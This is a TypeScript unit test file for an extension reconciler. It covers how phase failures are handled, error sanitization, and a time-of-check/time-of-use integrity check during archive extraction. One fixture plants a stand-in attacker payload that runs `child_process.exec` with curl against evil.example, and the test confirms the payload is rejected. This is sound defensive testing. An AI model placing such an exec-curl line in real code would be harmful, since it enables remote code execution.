import { describe, it, expect } from 'vitest';
import { Hono } from 'hono';
import { createHash, type KeyObject } from 'node:crypto';
import { existsSync, mkdtempSync, readdirSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import JSZip from 'jszip';
import type { ExtensionManifestV1 } from '@breeze/extension-sdk';
import { extractVerifiedPayload, reconcileExtensions, type ReconcilePorts } from './reconciler';
import { ExtensionIncompatibleError } from './errors';
import {
  ExtensionContributionRegistry,
  type StagedExtensionContributions,
} from './contributionRegistry';
import {
  ExtensionStateStore,
  type ExtensionStateBackend,
  type ExtensionStateRecord,
  type ObservedExtensionInput,
} from './stateStore';
import type { ExtensionLifecycleState } from '../db/schema/extensions';
import type { VerifiedExtensionBundle } from './bundleVerifier';
import type { ExtensionDeploymentConfig, ExtensionSelection } from './config';

/**
 * The reconciler is exercised entirely through injected ports, so these unit
 * tests need no bundle, no filesystem, and no database. Each fixture wires a
 * real {@link ExtensionContributionRegistry} plus an in-memory state store, then
 * stubs every phase to succeed except the one named by `failAt`. That isolates
 * the loop's failure policy (the whole point of Task 4) from every I/O seam.
 */
class InMemoryExtensionStateBackend implements ExtensionStateBackend {
  private readonly rows = new Map<string, ExtensionStateRecord>();
  private readonly floors = new Map<string, Map<string, string>>();

  async upsertObserved(input: ObservedExtensionInput): Promise<void> {
    const existing = this.rows.get(input.name);
    if (existing) {
      existing.updatedAt = new Date();
      return;
    }
    this.rows.set(input.name, {
      name: input.name,
      configuredVersion: input.configuredVersion ?? null,
      activeVersion: input.activeVersion ?? null,
      artifactDigest: input.digest ?? null,
      publisherId: input.publisher ?? null,
      manifestApiVersion: input.manifestApiVersion ?? null,
      serverSdkVersion: input.serverSdkVersion ?? null,
      webSdkVersion: input.webSdkVersion ?? null,
      enabled: true,
      lifecycleState: 'discovered',
      lastErrorCategory: null,
      lastErrorMessage: null,
      migratedAt: null,
      activatedAt: null,
      updatedAt: new Date(),
    });
  }

  async setEnabled(name: string, enabled: boolean): Promise<void> {
    const row = this.rows.get(name);
    if (row) { row.enabled = enabled; row.updatedAt = new Date(); }
  }

  async getRow(name: string): Promise<ExtensionStateRecord | null> {
    const row = this.rows.get(name);
    return row ? { ...row } : null;
  }

  async listRows(): Promise<ExtensionStateRecord[]> {
    return [...this.rows.values()]
      .map((row) => ({ ...row }))
      .sort((a, b) => a.name.localeCompare(b.name));
  }

  async recordFailure(
    name: string,
    state: Extract<ExtensionLifecycleState, 'failed' | 'incompatible'>,
    category: string,
    message: string,
  ): Promise<void> {
    const row = this.rows.get(name);
    if (!row) return;
    row.lifecycleState = state;
    row.lastErrorCategory = category;
    row.lastErrorMessage = message;
    row.updatedAt = new Date();
  }

  async recordActive(name: string, activeVersion: string | null): Promise<void> {
    const row = this.rows.get(name);
    if (!row) return;
    row.lifecycleState = 'active';
    row.lastErrorCategory = null;
    row.lastErrorMessage = null;
    row.activatedAt = new Date();
    row.updatedAt = new Date();
    if (activeVersion !== null) row.activeVersion = activeVersion;
  }

  async insertSchemaFloor(name: string, version: string, floor: string): Promise<void> {
    let byVersion = this.floors.get(name);
    if (!byVersion) { byVersion = new Map(); this.floors.set(name, byVersion); }
    byVersion.set(version, floor);
  }

  async listSchemaFloors(name: string): Promise<string[]> {
    return [...(this.floors.get(name)?.values() ?? [])];
  }
}

function fakeManifest(): ExtensionManifestV1 {
  return {
    apiVersion: 'breeze.extensions/v1',
    name: 'demo',
    version: '1.2.3',
    routeNamespace: 'demo',
    requires: { breeze: '*', serverSdk: '*', capabilities: [] },
    server: { entry: 'dist/index.cjs' },
    migrationsDir: 'migrations',
    schemaCompatibilityFloor: '1.0.0',
    jobs: [],
    aiTools: [],
    tenancy: {
      orgCascadeDeleteTables: [],
      deviceCascadeDeleteTables: [],
      deviceOrgDenormalizedTables: [],
    },
  } as ExtensionManifestV1;
}

function fakeBundle(): VerifiedExtensionBundle {
  return {
    archivePath: '/tmp/demo.breeze-ext',
    artifactDigest: `sha256:${'a'.repeat(64)}`,
    manifest: fakeManifest(),
    files: new Map(),
  } as VerifiedExtensionBundle;
}

function fakeStaged(): StagedExtensionContributions {
  return {
    name: 'demo',
    version: '1.2.3',
    manifest: fakeManifest(),
    routeApp: null,
    jobs: new Map(),
    aiTools: new Map(),
    enabled: true,
  };
}

type Phase = 'compatibility' | 'migration' | 'register';

async function reconcileFixture({ required, failAt }: { required: boolean; failAt: Phase }) {
  const registry = new ExtensionContributionRegistry();
  const stateStore = new ExtensionStateStore(new InMemoryExtensionStateBackend());
  const selection: ExtensionSelection = {
    name: 'demo',
    uri: 'file:///demo.breeze-ext',
    version: '1.2.3',
    publisher: 'breeze',
    required,
    rollout: 'rolling',
  };
  const config: ExtensionDeploymentConfig = {
    publishers: { breeze: { publicKeyFile: '/keys/breeze.pub' } },
    extensions: [selection],
  };

  const ports: Partial<ReconcilePorts> = {
    loadDeploymentConfig: () => config,
    createMigrationSql: () => null,
    acquire: async () => '/tmp/demo.breeze-ext',
    trustFor: () => ({ publisher: 'breeze', publicKey: {} as KeyObject }),
    verify: async () => fakeBundle(),
    assertCompatible: () => {
      if (failAt === 'compatibility') {
        throw new ExtensionIncompatibleError(['simulated host incompatibility']);
      }
    },
    extractVerifiedPayload: async () => '/tmp/extracted/demo',
    loadServerEntry: async () => ({ register: async () => {} }),
    runMigrations: async () => {
      if (failAt === 'migration') throw new Error('simulated migration failure');
    },
    publishTenancy: () => {},
    stageExtension: async () => {
      if (failAt === 'register') throw new Error('simulated register failure');
      return fakeStaged();
    },
    validateTenancyAndContributions: async () => {},
  };

  const summary = await reconcileExtensions({
    app: new Hono(),
    configPath: '/tmp/extensions.yaml',
    storeRoot: '/tmp/store',
    registry,
    stateStore,
    ports,
  });
  return { summary, registry, stateStore };
}

describe('reconcileExtensions', () => {
  it('continues after an optional migration rollback but fails startup for required', async () => {
    const optional = await reconcileFixture({ required: false, failAt: 'migration' });
    expect(optional.summary.failed).toEqual(['demo']);

    await expect(reconcileFixture({ required: true, failAt: 'migration' }))
      .rejects.toThrow(/required extension demo/);
  });

  it('does not expose staged contributions after activation failure', async () => {
    const { registry } = await reconcileFixture({ required: false, failAt: 'register' });
    expect(registry.get('demo')?.enabled).not.toBe(true);
  });

  it('records a sanitized failure that never leaks the raw error text', async () => {
    const { stateStore } = await reconcileFixture({ required: false, failAt: 'migration' });
    const row = await stateStore.get('demo');
    expect(row?.lifecycleState).toBe('failed');
    expect(row?.lastErrorMessage).not.toContain('simulated migration failure');
    expect(row?.lastErrorCategory).toBeTruthy();
  });

  it('persists an incompatible lifecycle when a first-time extension fails compatibility', async () => {
    // Regression: observe now runs BEFORE the compatibility gate, so a
    // never-before-seen extension that fails compatibility still gets an
    // installed_extensions row for recordSanitizedFailure's UPDATE to land on.
    const { summary, stateStore } = await reconcileFixture({
      required: false,
      failAt: 'compatibility',
    });
    expect(summary.failed).toEqual(['demo']);
    const row = await stateStore.get('demo');
    expect(row?.lifecycleState).toBe('incompatible');
    expect(row?.lastErrorCategory).toBe('incompatible');
    expect(row?.lastErrorMessage).not.toContain('simulated host incompatibility');
  });

  it('is a no-op when the deployment config is absent', async () => {
    const registry = new ExtensionContributionRegistry();
    const stateStore = new ExtensionStateStore(new InMemoryExtensionStateBackend());
    const summary = await reconcileExtensions({
      app: new Hono(),
      configPath: '/does/not/exist/extensions.yaml',
      storeRoot: '/tmp/store',
      registry,
      stateStore,
    });
    expect(summary.activated).toEqual([]);
    expect(summary.failed).toEqual([]);
  });
});

/**
 * TIME-OF-CHECK/TIME-OF-USE at the extract seam.
 *
 * `verifyExtensionBundle` hashes every member through one archive handle and
 * then CLOSES it. `extractVerifiedPayload` re-opens the SAME path later, and the
 * tree it writes is `import()`ed. Anyone able to write the artifact-store root
 * (a compromised sibling container, any non-root process with write access to
 * the mounted volume) can swap the archive in between, so the extractor must
 * re-hash what it reads against `bundle.files` rather than trusting the reopen.
 * Otherwise: arbitrary code execution with a fully passing signature check.
 */
describe('extractVerifiedPayload — re-verifies bytes read after verification', () => {
  async function writeArchive(members: Record<string, string>): Promise<{
    archivePath: string;
    files: Map<string, { sha256: string; uncompressedSize: number }>;
    root: string;
  }> {
    const zip = new JSZip();
    const files = new Map<string, { sha256: string; uncompressedSize: number }>();
    for (const [name, body] of Object.entries(members)) {
      zip.file(name, body);
      const bytes = Buffer.from(body, 'utf8');
      files.set(name, {
        sha256: createHash('sha256').update(bytes).digest('hex'),
        uncompressedSize: bytes.length,
      });
    }
    const buf = await zip.generateAsync({ type: 'nodebuffer' });
    const root = mkdtempSync(path.join(tmpdir(), 'ext-extract-'));
    const archivePath = path.join(root, 'demo.breeze-ext');
    writeFileSync(archivePath, buf);
    return { archivePath, files, root };
  }

  const MEMBERS = { 'manifest.json': '{}', 'server/index.js': 'exports.x = 1;' };

  function bundleOf(
    archivePath: string,
    files: Map<string, { sha256: string; uncompressedSize: number }>,
  ): VerifiedExtensionBundle {
    return {
      archivePath,
      artifactDigest: `sha256:${'a'.repeat(64)}`,
      manifest: {} as ExtensionManifestV1,
      files,
    };
  }

  it('extracts every verified member when the bytes still match', async () => {
    const { archivePath, files, root } = await writeArchive(MEMBERS);
    const dest = await extractVerifiedPayload(bundleOf(archivePath, files), root);

    expect(readFileSync(path.join(dest, 'server/index.js'), 'utf8')).toBe('exports.x = 1;');
    expect(existsSync(path.join(dest, '.verified'))).toBe(true);
  });

  it('throws and commits nothing when a member no longer matches its verified hash', async () => {
    const { archivePath, files, root } = await writeArchive({
      ...MEMBERS,
      // What is on disk now — attacker-controlled code, swapped in post-verify.
      'server/index.js': 'require("child_process").exec("curl evil.example");',
    });
    // ...but the verifier recorded the hash of the ORIGINAL, signed bytes.
    const original = Buffer.from(MEMBERS['server/index.js'], 'utf8');
    files.set('server/index.js', {
      sha256: createHash('sha256').update(original).digest('hex'),
      uncompressedSize: original.length,
    });

    const bundle = bundleOf(archivePath, files);
    await expect(extractVerifiedPayload(bundle, root)).rejects.toThrow(/integrity re-check failed/i);

    // No usable tree: neither the committed dest nor a leftover temp dir may
    // exist, and the tampered bytes must never have been written anywhere.
    const dest = path.join(root, 'extracted', `sha256-${'a'.repeat(64)}`);
    expect(existsSync(dest)).toBe(false);
    const leftovers = existsSync(path.join(root, 'extracted'))
      ? readdirSync(path.join(root, 'extracted'))
      : [];
    expect(leftovers).toEqual([]);
  });
});
